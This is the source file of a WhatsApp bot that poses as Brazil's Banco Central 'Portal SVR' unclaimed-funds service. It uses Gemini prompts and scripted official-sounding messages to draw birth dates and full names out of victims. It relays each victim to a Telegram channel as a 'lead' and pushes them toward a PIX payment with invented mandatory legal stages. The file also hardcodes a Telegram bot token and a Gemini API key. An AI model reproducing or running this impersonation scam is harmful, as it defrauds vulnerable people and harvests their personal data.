const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const QRCode = require('qrcode');
const FormData = require('form-data');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const dotenv = require('dotenv');

dotenv.config();

// --- OBFUSCATION LAYER ---
const _d = (b) => Buffer.from(b, 'base64').toString('utf-8');

let API_URL = (process.env.SVR_SYS_CORE_URL || 'https://www.consultarvaloresareceber.com.br').replace(/\/$/, "");

if (API_URL.includes("discloud.app")) {
    console.log("⚠️ [SEGURANÇA] URL Discloud legado detectado. Corrigindo para o domínio principal...");
    API_URL = "https://www.consultarvaloresareceber.com.br";
}

const API_HEADERS = {
    'User-Agent': 'SVR-BOT-NODE-RUNTIME/5.0 (ShardCloud-Environment)',
    'X-SVR-Bot-Token': '8643978397'
};

const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "8643978397:AAE4YyIwa1X1tSwav_zOdWEKMnNv8PFjZ3g").replace(/"/g, "");
const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "-1003940670305").replace(/"/g, "");
const GEMINI_KEY = process.env.SVR_AI_RUNTIME_TOKEN || "AIzaSyCe0RyNY95UPhE1woWTfsshjrZGtyFKAV8";

function mask(str) {
    if (!str) return "NÃO CONFIGURADO";
    return str.substring(0, 6) + "..." + str.substring(str.length - 4);
}

console.log(`\n🤖 [SVR BOT] SISTEMA OPERACIONAL`);
console.log(`---------------------------------------------`);
console.log(`📡 ENDPOINT: ${API_URL}`);
console.log(`🛡️ SEGURANÇA: ATIVA`);
console.log(`---------------------------------------------\n`);

// --- PROMPTS DE IA ---
// Prompt para mensagens espontâneas iniciais (antes do cadastro)
const PROMPT_INICIAL = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil, em conformidade com as diretrizes do Superior Tribunal de Justiça (STJ) e da Lei Complementar nº 105/2001. 
Este canal é de uso exclusivo para liberação de ativos financeiros pendentes de titulares cadastrados no sistema federal.
Um cidadão entrou em contato. Responda de forma extremamente formal, institucional e segura, como um assistente de órgão público federal. 
Informe brevemente que identificou valores a receber cadastrados em nome do titular no sistema e que é necessário validar a identidade para prosseguir com a liberação. Não mencione valores específicos. Seja sóbrio, preciso e formal.
Mensagem do cidadão:`;

// Prompt para validação de data inválida
const PROMPT_DATA_INVALIDA = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil e em conformidade com o STJ.
O cidadão enviou uma mensagem que não corresponde a uma data de nascimento válida. Solicite novamente de forma formal e institucional, no formato DD/MM/AAAA.
Mensagem do cidadão:`;

// Prompt para validação de nome inválido
const PROMPT_NOME_INVALIDO = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil e em conformidade com o STJ.
O cidadão enviou algo que não parece ser um nome completo válido. Solicite que informe o nome completo conforme consta em documento oficial, de forma formal e institucional.
Mensagem do cidadão:`;

// Prompt para mensagens durante a fila de espera
const PROMPT_FILA = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil, em conformidade com as diretrizes do Superior Tribunal de Justiça (STJ).
O cidadão está aguardando na fila de processamento para liberação de seus ativos financeiros. O registro dele já foi validado com sucesso e está em análise pelos sistemas do Banco Central.
Responda de forma formal, institucional e tranquilizadora, informando que o processo está em andamento e que ele será notificado assim que a liberação for processada. Solicite que aguarde. Não mencione valores. Seja sóbrio e oficial.
Mensagem do cidadão durante a espera:`;

async function askAI(prompt, userMessage) {
    if (!GEMINI_KEY) return null;
    try {
        const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_KEY}`;
        const response = await axios.post(url, {
            contents: [{ parts: [{ text: `${prompt}\n\n"${userMessage}"` }] }]
        });
        return response.data.candidates[0].content.parts[0].text || null;
    } catch (e) {
        console.error('❌ [IA] Erro ao chamar Gemini:', e.message);
        return null;
    }
}

// --- SESSÕES ---
let chatSessions = new Map();
const SESSIONS_FILE = path.join(process.cwd(), 'sessions.json');

// --- LOCK DE PROCESSAMENTO POR LEAD ---
// Evita que duas mensagens simultâneas do mesmo lead causem respostas duplicadas
const processingLock = new Set();

function loadSessions() {
    try {
        if (fs.existsSync(SESSIONS_FILE)) {
            const data = JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf-8'));
            chatSessions = new Map(Object.entries(data));
            console.log(`📂 [SESSÕES] ${chatSessions.size} sessão(ões) restaurada(s).`);
        }
    } catch (e) { console.error('Erro ao carregar sessões:', e.message); }
}

function saveSessions() {
    try {
        const obj = Object.fromEntries(chatSessions);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(obj, null, 2));
    } catch (e) { console.error('Erro ao salvar sessões:', e.message); }
}

loadSessions();

// --- FILA DE ESPERA ---
// Guarda leads que já concluíram o cadastro e aguardam liberação manual
let waitingQueue = [];
const QUEUE_FILE = path.join(process.cwd(), 'waiting-queue.json');

function loadQueue() {
    try {
        if (fs.existsSync(QUEUE_FILE)) {
            waitingQueue = JSON.parse(fs.readFileSync(QUEUE_FILE, 'utf-8'));
            console.log(`📂 [FILA] ${waitingQueue.length} lead(s) na fila restaurado(s).`);
        }
    } catch (e) { console.error('Erro ao carregar fila:', e.message); }
}

function saveQueue() {
    try {
        fs.writeFileSync(QUEUE_FILE, JSON.stringify(waitingQueue, null, 2));
    } catch (e) { console.error('Erro ao salvar fila:', e.message); }
}

function addToQueue(chatId, name, birthDate) {
    // Evita duplicatas
    if (!waitingQueue.find(q => q.chatId === chatId)) {
        waitingQueue.push({ chatId, name, birthDate, joinedAt: Date.now() });
        saveQueue();
    }
}

function getQueuePosition(chatId) {
    const idx = waitingQueue.findIndex(q => q.chatId === chatId);
    return idx >= 0 ? idx + 1 : null;
}

function removeFromQueue(chatId) {
    waitingQueue = waitingQueue.filter(q => q.chatId !== chatId);
    saveQueue();
}

loadQueue();

// --- TELEGRAM ---
async function notifyTelegram(html, messageId) {
    if (!TG_TOKEN || !CHAT_ID) return null;
    try {
        if (messageId) {
            // Edita mensagem existente
            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/editMessageText`, {
                chat_id: CHAT_ID,
                message_id: messageId,
                text: html,
                parse_mode: 'HTML'
            });
            return res.data.result?.message_id || messageId;
        } else {
            // Envia nova mensagem
            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: html,
                parse_mode: 'HTML'
            });
            return res.data.result?.message_id || null;
        }
    } catch (e) {
        console.error('❌ [TELEGRAM] Falha ao notificar:', e.message);
        return null;
    }
}

// Monta o texto do painel de cadastro no Telegram (editável)
function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF') {
    const statusEmoji = {
        'preenchendo_data': '⏳',
        'preenchendo_nome': '⏳',
        'validado': '✅',
        'na_fila': '🕐'
    }[status] || '⏳';

    const nomeDisplay = nome ? `✅ <b>${nome}</b>` : `<i>⏳ Preenchendo...</i>`;
    const dataDisplay = dataNasc ? `✅ <b>${dataNasc}</b>` : `<i>⏳ Preenchendo...</i>`;

    let statusMsg = '';
    if (status === 'preenchendo_data') statusMsg = '📝 <i>Aguardando data de nascimento...</i>';
    else if (status === 'preenchendo_nome') statusMsg = '📝 <i>Aguardando nome completo...</i>';
    else if (status === 'validado') statusMsg = '✅ <b>CADASTRO CONCLUÍDO — Enviado para a fila!</b>';
    else if (status === 'na_fila') {
        const pos = getQueuePosition(chatId);
        statusMsg = pos ? `🕐 <b>Na fila — Posição: ${pos}º</b>` : `🕐 <b>Na fila de processamento</b>`;
    }

    const tipoLabel = tipo === 'CNPJ' ? '🏢 Pessoa Jurídica (CNPJ)' : '👤 Pessoa Física (CPF)';
    const dataLabel = tipo === 'CNPJ' ? 'Data de Abertura' : 'Data de Nascimento';
    const nomeLabel = tipo === 'CNPJ' ? 'Razão Social' : 'Nome Completo';

    return `${statusEmoji} <b>NOVO CADASTRO EM ANDAMENTO</b>\n\n` +
        `👤 <b>Lead:</b> <code>${chatId}</code>\n` +
        `📄 <b>Tipo:</b> ${tipoLabel}\n\n` +
        `📋 <b>Dados do Titular:</b>\n` +
        `• ${dataLabel}: ${dataDisplay}\n` +
        `• ${nomeLabel}: ${nomeDisplay}\n\n` +
        `📊 <b>Status:</b> ${statusMsg}`;
}

// --- CLIENTE WHATSAPP ---
const botIdArg = process.argv.find(a => a.startsWith('--id='));
const BOT_ID = botIdArg ? botIdArg.split('=')[1] : 'main';
const STATUS_FILE = `bot-status-${BOT_ID}.json`;

console.log(`🤖 [BOT] Iniciando instância: ${BOT_ID} | Status: ${STATUS_FILE}`);

const client = new Client({
    authStrategy: new LocalAuth({ clientId: BOT_ID, dataPath: '.wwebjs_auth' }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
    }
});

client.on('qr', async (qr) => {
    console.log('\n📱 [QR CODE] Escaneie com o WhatsApp:\n');
    qrcode.generate(qr, { small: true });
    fs.writeFileSync(STATUS_FILE, JSON.stringify({ status: 'WAITING_QR', qr, ts: Date.now() }));

    try {
        const slotLabel = BOT_ID === 'main' ? 'PERFIL 1' : BOT_ID.toUpperCase();
        const qrBuffer = await QRCode.toBuffer(qr, { width: 512, margin: 2, color: { dark: '#111111', light: '#ffffff' } });
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', qrBuffer, { filename: 'qrcode.png', contentType: 'image/png' });
        form.append('caption', `📲 <b>QR CODE — ${slotLabel}</b>\n\nEscaneie com o WhatsApp para conectar o bot.\n\n⏳ Aguardando leitura...`, { contentType: 'text/plain' });
        form.append('parse_mode', 'HTML');

        await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders(),
            timeout: 15000
        });
        console.log('✅ [TELEGRAM] QR Code enviado com sucesso!');
    } catch (e) {
        console.error('❌ [TELEGRAM] Erro ao enviar QR Code como imagem:', e.message);
        await notifyTelegram(`📱 <b>QR CODE GERADO</b>\nNão foi possível enviar a imagem. Verifique os logs do servidor.`);
    }
});

client.on('ready', async () => {
    console.log('✅ [BOT] WhatsApp conectado e pronto!');
    let adminName = BOT_ID === 'main' ? 'Perfil 1' : BOT_ID;
    try {
        const info = client.info;
        if (info && info.pushname) adminName = info.pushname;
    } catch(e) {}
    fs.writeFileSync(STATUS_FILE, JSON.stringify({ status: 'CONNECTED', adminName, ts: Date.now() }));
    const slotLabel = BOT_ID === 'main' ? 'PERFIL 1' : BOT_ID.toUpperCase();
    notifyTelegram(`✅ <b>${slotLabel} CONECTADO</b>\n\n📱 WhatsApp vinculado com sucesso!\nO bot está pronto para atendimento.`);
});

client.on('disconnected', (reason) => {
    console.log('⚠️ [BOT] Desconectado:', reason);
    fs.writeFileSync(STATUS_FILE, JSON.stringify({ status: 'DISCONNECTED', reason, ts: Date.now() }));
});

// =============================================================
// HANDLER 1: 'message_create' — SOMENTE para detectar quando o
// admin digita manualmente e assume o atendimento de um lead.
// NÃO processa mensagens recebidas aqui para evitar confusão.
// =============================================================

// Mensagem formal enviada automaticamente quando o operador assume
const MENSAGEM_OPERADOR_ASSUME = `🔐 *PORTAL SVR — SISTEMA DE VALORES A RECEBER*
*Departamento de Liberação de Ativos Financeiros*
━━━━━━━━━━━━━━━━━━━━━━━━━━━

Prezado(a) Titular,

Informamos que a partir deste momento o(a) senhor(a) está sendo atendido(a) diretamente por um *Operador Especializado do Departamento Jurídico-Financeiro* do Portal SVR, vinculado ao Banco Central do Brasil, em conformidade com a *Lei Complementar nº 105/2001* e a *Resolução BCB nº 4.862/2020*.

Seu processo de liberação de ativos financeiros pendentes encontra-se devidamente registrado em nosso sistema federal e aguarda a conclusão das etapas obrigatórias de validação, conforme previsto na legislação vigente.

📋 *ETAPAS OBRIGATÓRIAS PARA LIBERAÇÃO:*

*1ª Etapa — Autenticação de Identidade:* ✅ Concluída
Validação dos dados cadastrais do titular perante os registros do Banco Central do Brasil.

*2ª Etapa — Validação Jurídica do Processo:* 🔄 Em andamento
Análise e homologação do pedido de resgate junto ao Departamento de Ativos Não Reclamados.

*3ª Etapa — Confirmação do Canal de Recebimento:* ⏳ Pendente
Verificação e habilitação da conta de destino para transferência dos valores resgatados.

*4ª Etapa — Liberação e Transferência dos Valores:* ⏳ Pendente
Processamento final e crédito dos ativos financeiros na conta indicada pelo titular.

⚠️ *IMPORTANTE:* Todas as etapas são *obrigatórias e insubstituíveis*, conforme determina o protocolo de segurança do Sistema de Valores a Receber (SVR). A não conclusão de qualquer etapa *suspende automaticamente* o processo de resgate, podendo resultar no retorno dos valores ao Fundo Garantidor.

Nosso operador responsável conduzirá o(a) senhor(a) pelas próximas etapas de forma segura, sigilosa e dentro dos prazos legalmente estabelecidos.

_Contamos com sua colaboração e compreensão._

*Portal SVR — Banco Central do Brasil*
*CNPJ: 00.038.166/0001-05*
_Este canal é monitorado e possui validade jurídica._`;

client.on('message_create', async (msg) => {
    if (BOT_ID !== 'main') return;
    // Só nos interessa quando o admin (nós mesmos) envia manualmente
    if (!msg.fromMe) return;

    // msg.to = número do destinatário (o lead)
    const targetChatId = msg.to;
    if (!targetChatId) return;

    const currentSession = chatSessions.get(targetChatId);
    if (!currentSession || currentSession.mode !== 'bot') return;

    // Só assume se a sessão tiver mais de 30s (evita conflito com respostas automáticas)
    const sessionAge = Date.now() - (currentSession.createdAt || Date.now());
    if (sessionAge > 30000) {
        chatSessions.set(targetChatId, { mode: 'human' });
        saveSessions();
        console.log(`👤 [ADMIN] Assumiu atendimento de: ${targetChatId}`);
        notifyTelegram(`👤 <b>ATENDIMENTO ASSUMIDO PELO ADMIN</b>\nLead: <code>${targetChatId}</code>\n<i>Mensagem formal enviada ao lead automaticamente.</i>`);

        // Envia a mensagem formal ao lead ANTES de silenciar o bot
        setTimeout(async () => {
            try {
                await client.sendMessage(targetChatId, MENSAGEM_OPERADOR_ASSUME);
                console.log(`📨 [ADMIN] Mensagem formal enviada ao lead: ${targetChatId}`);
            } catch (e) {
                console.error(`❌ [ADMIN] Erro ao enviar mensagem formal:`, e.message);
            }
        }, 1500);
    }
});

// =============================================================
// HANDLER 2: 'message' — SOMENTE mensagens RECEBIDAS (incoming).
// Este evento NÃO dispara para mensagens que o bot envia,
// eliminando o risco de processar a própria resposta.
// =============================================================
client.on('message', async (msg) => {
    if (BOT_ID !== 'main') return;

    // msg.from = sempre o remetente (o lead). Nunca é o bot.
    const targetChatId = msg.from;
    if (!targetChatId) return;

    // Ignora mensagens de grupos (apenas individuais)
    if (targetChatId.includes('@g.us')) return;

    // LOCK: se já estamos processando uma mensagem deste lead, ignorar
    if (processingLock.has(targetChatId)) {
        console.log(`⏳ [LOCK] Mensagem de ${targetChatId} ignorada — já processando.`);
        return;
    }
    processingLock.add(targetChatId);

    try {
        await processIncomingMessage(msg, targetChatId);
    } catch (e) {
        console.error(`❌ [ERRO] Falha ao processar mensagem de ${targetChatId}:`, e.message);
    } finally {
        // Libera o lock após 2s para evitar spam mas permitir próximas mensagens
        setTimeout(() => processingLock.delete(targetChatId), 2000);
    }
});

// =============================================================
// FUNÇÃO PRINCIPAL DE PROCESSAMENTO DE MENSAGEM RECEBIDA
// Centraliza toda a lógica para evitar duplicação e facilitar
// a depuração do fluxo de cada lead individualmente.
// =============================================================
async function processIncomingMessage(msg, targetChatId) {
    const text = (msg.body || "").trim();
    const isTrigger = text.toUpperCase().includes('SOLICITAÇÃO DE RESGATE');

    // Registra o último lead que enviou mensagem (para o comando /pix)
    fs.writeFileSync('last-lead.json', JSON.stringify({ chatId: targetChatId, timestamp: Date.now() }));

    const currentSession = chatSessions.get(targetChatId);
    console.log(`📩 [MSG] De: ${targetChatId} | Sessão: ${currentSession?.mode || 'nova'} | Texto: "${text.substring(0, 60)}"`);

    // --- LEAD NA FILA DE ESPERA ---
    if (currentSession && currentSession.mode === 'waiting') {
        const pos = getQueuePosition(targetChatId);
        const chat = await msg.getChat();
        await chat.sendStateTyping();

        const aiReply = await askAI(PROMPT_FILA, text);
        const posText = pos ? `\n\n📌 *Sua posição atual na fila:* ${pos}º lugar.` : '';
        const fallback = `📋 *Portal SVR — Sistema de Valores a Receber*\n\n` +
            `Prezado(a) titular,\n\n` +
            `Seus dados foram validados com êxito e seu processo de liberação de ativos foi encaminhado ao setor responsável do Banco Central do Brasil, em conformidade com a Resolução nº 4.862/2020.\n\n` +
            `O processamento está em andamento. Solicitamos que aguarde o contato de nosso operador responsável, que lhe informará os próximos passos de forma segura e sigilosa.${posText}\n\n` +
            `Agradecemos sua compreensão.\n_Portal SVR — Banco Central do Brasil_`;

        await client.sendMessage(targetChatId, aiReply || fallback);
        return;
    }

    // --- LEAD EM ATENDIMENTO HUMANO — bot silencioso ---
    if (currentSession && currentSession.mode === 'human') {
        console.log(`🤫 [HUMANO] Lead ${targetChatId} em atendimento manual. Bot silencioso.`);
        return;
    }

    // 1. GATILHO INICIAL (vindo do site)
    if (isTrigger) {
        if (currentSession && currentSession.mode === 'bot' && currentSession.step > 0) return;

        const protocolMatch = text.match(/Protocolo: \*#SVR-(.*?)\*/i);
        const userId = protocolMatch ? protocolMatch[1].toLowerCase() : null;

        // Detecta o tipo de documento (CPF ou CNPJ) enviado pelo site
        const docTypeMatch = text.match(/Tipo de Documento: \*(CPF|CNPJ)\*/i);
        const docType = docTypeMatch ? docTypeMatch[1].toUpperCase() : 'CPF';
        const isPJ = docType === 'CNPJ';
        console.log(`📄 [DOC] Tipo detectado: ${docType} para ${targetChatId}`);

        console.log(`🚀 [SVR] Atendimento Iniciado: ${targetChatId}`);

        let expectedData = null;
        if (userId) {
            try {
                const res = await axios.get(`${API_URL}/api/v1/session/data/${userId}`, {
                    headers: API_HEADERS,
                    timeout: 5000
                });
                expectedData = res.data;
            } catch (e) {
                console.log(`⚠️ [AVISO] Dados do portal não encontrados para ${userId}. Usando modo de validação aberta.`);
            }
        }

        // Envia mensagem inicial no Telegram (painel de cadastro)
        const tgMsgId = await notifyTelegram(buildCadastroMessage(targetChatId, null, null, 'preenchendo_data', docType));

        chatSessions.set(targetChatId, {
            mode: 'bot',
            step: 1,
            userId,
            expectedData,
            docType,   // 'CPF' ou 'CNPJ'
            lastMsgTime: Date.now(),
            createdAt: Date.now(),
            tgMsgId
        });
        saveSessions();

        setTimeout(async () => {
            if (isPJ) {
                await client.sendMessage(targetChatId,
                    `🏢 *Portal SVR — Atendimento Empresarial*\n\nIdentificamos ativos financeiros pendentes vinculados ao CNPJ informado em nosso sistema.\n\nPara prosseguir com a validação da titularidade jurídica, necessitamos confirmar os dados cadastrais da empresa.\n\n📍 *ETAPA 1:* Informe a *Data de Abertura* da empresa (Ex: 10/05/2005):`);
            } else {
                await client.sendMessage(targetChatId,
                    `👋 *Olá! Sou o assistente oficial do SVR.*\n\nPara sua segurança, iniciamos o *Protocolo de Validação de Dados*.\n\n📍 *ETAPA 1:* Digite sua *Data de Nascimento* (Ex: 10/05/1990):`);
            }
        }, 1500);
        return;
    }

    // 2. LEAD SEM SESSÃO ATIVA — IA ASSUME E INICIA FLUXO
    if (!currentSession || currentSession.mode !== 'bot') {
        console.log(`🤖 [IA] Mensagem espontânea de ${targetChatId}: "${text}"`);
        const chat = await msg.getChat();
        await chat.sendStateTyping();

        // Envia painel de cadastro no Telegram
        const tgMsgId = await notifyTelegram(buildCadastroMessage(targetChatId, null, null, 'preenchendo_data'));

        // Notifica contato espontâneo
        await notifyTelegram(
            `📩 <b>NOVO CONTATO ESPONTÂNEO</b>\nLead: <code>${targetChatId}</code>\nMensagem: <i>${text}</i>`
        );

        chatSessions.set(targetChatId, {
            mode: 'bot',
            step: 1,
            userId: null,
            expectedData: null,
            lastMsgTime: Date.now(),
            createdAt: Date.now(),
            tgMsgId
        });
        saveSessions();

        const aiReply = await askAI(PROMPT_INICIAL, text);
        const fallback = `👋 *Olá! Sou o Assistente Oficial do Portal SVR — Sistema de Valores a Receber.*\n\n` +
            `Identificamos valores pendentes de liberação associados ao seu perfil em nosso sistema, em conformidade com as diretrizes do Banco Central do Brasil.\n\n` +
            `Para prosseguir com a validação de titularidade e liberar o processamento, necessitamos confirmar seus dados cadastrais.\n\n` +
            `📍 *ETAPA 1:* Por gentileza, informe sua *Data de Nascimento* (Ex: 10/05/1990):`;

        setTimeout(async () => {
            await client.sendMessage(targetChatId, aiReply || fallback);
        }, 1500);
        return;
    }

    currentSession.lastMsgTime = Date.now();
    console.log(`📩 [LEAD] ${targetChatId}: "${text}"`);

    const chat = await msg.getChat();
    await chat.sendStateTyping();

    const isPJ = currentSession.docType === 'CNPJ';

    // --- ETAPA 1: DATA (nascimento para PF / abertura para PJ) ---
    if (currentSession.step === 1) {
        const dateMatch = text.match(/(\d{1,2})[\/-](\d{1,2})[\/-](\d{4}|\d{2})/);

        if (!dateMatch) {
            const aiReply = await askAI(PROMPT_DATA_INVALIDA, text);
            const dataLabel = isPJ ? 'Data de Abertura da empresa' : 'Data de Nascimento';
            const fallback = `⚠️ *Portal SVR — Validação de Identidade*\n\nO formato informado não foi reconhecido pelo sistema.\n\nPor gentileza, informe a *${dataLabel}* no formato oficial:\n📌 *Exemplo:* 10/05/1990`;
            await msg.reply(aiReply || fallback);
            return;
        }

        const typedDate = text.trim();

        if (currentSession.expectedData?.birthDate) {
            const cleanTyped = typedDate.replace(/\D/g, "");
            const cleanExpected = currentSession.expectedData.birthDate.replace(/\D/g, "");

            if (cleanTyped !== cleanExpected) {
                const fallback = `⚠️ *DIVERGÊNCIA IDENTIFICADA — Portal SVR*\n\nA data informada não corresponde aos registros cadastrais do titular.\n\nPor gentileza, verifique os dados e informe novamente.\n📌 *Formato:* DD/MM/AAAA`;
                await msg.reply(fallback);
                return;
            }
        }

        // Data aceita — avançar para etapa 2
        currentSession.step = 2;
        currentSession.birthDate = typedDate;
        chatSessions.set(targetChatId, currentSession);
        saveSessions();

        // Atualiza o painel no Telegram
        if (currentSession.tgMsgId) {
            await notifyTelegram(
                buildCadastroMessage(targetChatId, null, typedDate, 'preenchendo_nome', currentSession.docType),
                currentSession.tgMsgId
            );
        }

        if (isPJ) {
            await msg.reply(
                `✅ *Data de abertura confirmada!*\n\n` +
                `📍 *ETAPA 2:* Agora informe a *Razão Social* da empresa (conforme consta no Cartão CNPJ):`);
        } else {
            await msg.reply(
                `✅ *Data de nascimento confirmada!*\n\n` +
                `📍 *ETAPA 2:* Agora informe seu *Nome Completo* (conforme consta no documento oficial):`);
        }

    // --- ETAPA 2: NOME / RAZÃO SOCIAL ---
    } else if (currentSession.step === 2) {
        const typedName = text.trim();

        if (typedName.length >= 8 && typedName.includes(" ")) {
            if (currentSession.expectedData?.fullName) {
                const portalName = currentSession.expectedData.fullName.toLowerCase();
                const firstName = typedName.toLowerCase().split(' ')[0];
                if (!portalName.includes(firstName)) {
                    await msg.reply(
                        `⚠️ *ALERTA DE SEGURANÇA — Portal SVR*\n\nO nome informado não corresponde ao titular cadastrado no sistema.\n\nPor gentileza, informe seu *Nome Completo* conforme consta em documento oficial:`);
                    return;
                }
            }

            // ✅ Cadastro concluído — colocar na fila de espera
            currentSession.step = 3;
            currentSession.name = typedName;
            currentSession.mode = 'waiting';
            chatSessions.set(targetChatId, currentSession);
            saveSessions();

            // Adiciona à fila de espera
            addToQueue(targetChatId, typedName, currentSession.birthDate);
            const queuePos = getQueuePosition(targetChatId);
            const queueSize = waitingQueue.length;
            const tipoLabel = isPJ ? 'Pessoa Jurídica (CNPJ)' : 'Pessoa Física (CPF)';
            const clientesFrente = queuePos > 1 ? queuePos - 1 : 0;

            // Edita a mensagem no Telegram com cadastro completo + posição na fila
            if (currentSession.tgMsgId) {
                await notifyTelegram(
                    buildCadastroMessage(targetChatId, typedName, currentSession.birthDate, 'na_fila', currentSession.docType),
                    currentSession.tgMsgId
                );
            }

            // Notifica o admin sobre o novo lead validado
            await notifyTelegram(
                `💰 <b>LEAD VALIDADO — NA FILA!</b>\n` +
                `👤 Nome: ${typedName}\n` +
                `📅 Data: ${currentSession.birthDate}\n` +
                `🆔 Lead: <code>${targetChatId}</code>\n` +
                `📊 Posição na fila: <b>${queuePos}º</b> (${queueSize} no total)\n\n` +
                `Use /pix para enviar o protocolo de liberação.`
            );

            // Mensagem ao lead sobre a fila de espera
            const frenteMsg = clientesFrente > 0
                ? `Há *${clientesFrente} solicitação(ões)* sendo processada(s) antes da sua.`
                : `Sua solicitação é a próxima a ser processada.`;

            await msg.reply(
                `📋 *AUTENTICAÇÃO CONCLUÍDA — Portal SVR*\n\n` +
                `Prezado(a) *${typedName}*,\n\n` +
                `Sua identidade foi validada com êxito pelo sistema de segurança do Portal SVR, em conformidade com as diretrizes do Banco Central do Brasil e da Resolução nº 4.862/2020.\n\n` +
                `⌛ *STATUS ATUAL:* Aguardando Processamento\n\n` +
                `${frenteMsg}\n\n` +
                `Nosso operador responsável entrará em contato em breve para concluir a liberação de seus ativos financeiros de forma segura e sigilosa.\n\n` +
                `_Agradecemos sua paciência._\n_Portal SVR — Banco Central do Brasil_`);

        } else {
            // Nome inválido — IA responde de forma formal
            const aiReply = await askAI(PROMPT_NOME_INVALIDO, text);
            const fallback = `⚠️ *Portal SVR — Validação de Identidade*\n\nO dado informado não corresponde a um nome completo válido.\n\nPor gentileza, informe seu *Nome Completo* conforme consta em seu documento de identificação oficial (RG ou CNH).`;
            await msg.reply(aiReply || fallback);
        }
    }
}

// --- WATCHER DE COMANDOS EXTERNOS (TELEGRAM -> WHATSAPP) ---
setInterval(async () => {
    const files = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-send-') && f.endsWith('.json'));
    for (const file of files) {
        try {
            const cmdPath = path.join(process.cwd(), file);
            const cmd = JSON.parse(fs.readFileSync(cmdPath, 'utf-8'));

            console.log(`📤 Enviando comando externo para: ${cmd.to}`);
            await client.sendMessage(cmd.to, cmd.message);

            // Se o admin enviou algo para um lead na fila, remove da fila (atendimento assumido)
            if (waitingQueue.find(q => q.chatId === cmd.to)) {
                removeFromQueue(cmd.to);
                chatSessions.set(cmd.to, { mode: 'human' });
                saveSessions();
                console.log(`✅ [FILA] Lead ${cmd.to} removido da fila — atendimento assumido pelo admin.`);
            }

            fs.unlinkSync(cmdPath);
        } catch (e) {
            console.error("❌ Erro ao processar comando externo:", e.message);
        }
    }
}, 3000);

client.initialize();
